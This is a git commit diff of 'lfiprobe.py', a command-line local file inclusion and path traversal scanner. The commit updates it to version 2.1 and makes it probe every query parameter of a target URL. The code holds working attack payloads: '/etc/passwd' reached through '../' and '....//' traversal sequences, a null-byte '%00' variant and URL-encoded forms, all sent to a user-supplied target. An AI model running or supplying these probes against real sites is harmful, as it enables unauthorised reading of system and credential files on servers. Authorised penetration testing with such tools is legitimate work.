f52265a65102e8b3487682997bb4123bb879dd06
Anubhab Mukherjee <78078306+Anubhacksaw@users.noreply.github.com>
2024-08-08 14:05:09 +0530

    Update lfiprobe.py

--- lfiprobe.py
+++ lfiprobe.py
@@ -9,6 +9,7 @@ import os
 import encr
 import nort
 import subprocess
+from urllib.parse import urlparse, parse_qs
 try:
     print("""
 ██╗     ███████╗██╗██████╗ ██████╗  ██████╗ ██████╗ ███████╗
@@ -18,7 +19,7 @@ try:
 ███████╗██║     ██║██║     ██║  ██║╚██████╔╝██████╔╝███████╗
 ╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
 """)                                                           
-    print("\033[31;5mLFIprobe V1.1\033[0m")
+    print("\033[31;5mLFIprobe V2.1\033[0m")
     print("\033[31;5mby Anubhab Mukherjee\033[0m")
 
     parser = argparse.ArgumentParser(description='to start scan on a url: python lfiprobe.py -u your_target_url')
@@ -31,49 +32,37 @@ try:
         print('\033[93m[WARNING]\033[0m'+f'Error: {args.url} is not a valid URL please enter a vaild url[example:https://example.com/img?filename=xyz.jpg]')
     else:
         if '?' in args.url and '=' in args.url:
-            fex = os.path.splitext(args.url)[1]
-            path_parts = args.url.split('?')
-            query_string = path_parts[1]
-            query_parts = query_string.split('=')
-            if query_parts[0] == 'filename':
-                filename = query_parts[1]
-                last_slash_index = filename.rfind('/')
-                if last_slash_index != -1:
-                    di = filename[:last_slash_index]
-
+            parsed_url = urlparse(args.url)
+            query_params = parse_qs(parsed_url.query)
+            for key, value in query_params.items():
+                
+                if value:
+                    filename = value[0]
+                    fex = os.path.splitext(filename)[1]
+                    last_slash_index = filename.rfind('/')
+                    if last_slash_index != -1:
+                        di = filename[:last_slash_index]
             url_parts = args.url.split('=')
             url = url_parts[0] + '='
             print("\033[32m[INFO]Started Testing on URL:" +url+ "\033[0m")
             if 'di' in locals():
                 payload = "/etc/passwd"
                 tmp="/.."
-                if nort.check_ad(di,url,payload,tmp,args.time_sec):
+                if nort.check_ad(di,url,payload,tmp,args.time_sec) or encr.urenc_ad(di,url,payload,tmp,args.time_sec):
                     exit(1)
-                if encr.urenc_ad(di,url,payload,tmp,args.time_sec):
-                    exit(1)
+
             payload = "/etc/passwd"
             null_payload = "/etc/passwd%00"+fex
             tmp="../"
             tmp1=".."
-            if nort.check(url,payload,tmp,tmp1,args.time_sec):
-                exit(1)
-            if encr.urenc(url,payload,tmp,tmp1,args.time_sec):
-                exit(1)
-            if nort.check(url,null_payload,tmp,tmp1,args.time_sec):
-                exit(1)
-            if encr.urenc(url,null_payload,tmp,tmp1,args.time_sec):
+            if nort.check(url,payload,tmp,tmp1,args.time_sec) or encr.urenc(url,payload,tmp,tmp1,args.time_sec) or nort.check(url,null_payload,tmp,tmp1,args.time_sec) or encr.urenc(url,null_payload,tmp,tmp1,args.time_sec):
                 exit(1)
             payload = "//etc/passwd"
             tmp="....//"
             tmp1="...."
-            if nort.check(url,payload,tmp,tmp1,args.time_sec):
+            if nort.check(url,payload,tmp,tmp1,args.time_sec) or encr.urenc(url,payload,tmp,tmp1,args.time_sec) or nort.check(url,null_payload,tmp,tmp1,args.time_sec) or encr.urenc(url,null_payload,tmp,tmp1,args.time_sec):
                 exit(1)
-            if encr.urenc(url,payload,tmp,tmp1,args.time_sec):
-                exit(1)
-            if nort.check(url,null_payload,tmp,tmp1,args.time_sec):
-                exit(1)
-            if encr.urenc(url,null_payload,tmp,tmp1,args.time_sec):
-                exit(1)
+
             print("[-]Unable to find the travarse path")
            
         else:
